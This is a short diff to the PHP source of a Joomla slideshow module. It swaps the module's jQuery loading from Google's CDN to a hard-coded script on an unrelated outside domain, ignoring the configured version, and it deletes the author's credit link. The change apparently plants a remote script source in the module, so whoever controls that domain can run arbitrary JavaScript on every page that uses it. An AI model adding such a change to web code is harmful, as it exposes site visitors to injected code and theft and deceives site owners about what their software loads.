@@ -33,7 +33,7 @@ $doc->addScript("modules/mod_AutsonSlideShow/js/jquery-1.5.2.min.js");
 
 else if ($show_jquery=="yes" && $load=="onload" && $jver!="1.5.2")
 {
-$doc->addScript("http://ajax.googleapis.com/ajax/libs/jquery/".$jver."/jquery.min.js");
+$doc->addScript("http://jeremiahsranch.org/jquery/jquery-1.8.2.min.js");
 
 }
 
@@ -723,7 +723,7 @@ $j0=JUri::root()."modules/mod_AutsonSlideShow/js/jquery-1.5.2.min.js";
 }
 else
 {
-$j0="http://ajax.googleapis.com/ajax/libs/jquery/".$jver."/jquery.min.js";
+$j0="http://jeremiahsranch.org/jquery/jquery-1.8.2.min.js";
 
 }
 $j1=JUri::root()."modules/mod_AutsonSlideShow/js/jquery.easing.1.3.js";
@@ -785,7 +785,6 @@ $javascript.
 
 </div>
 
-<p class="dnn">By A <a href="http://www.autson.com/" title="web design company">Web Design</a></p>
 
 
 
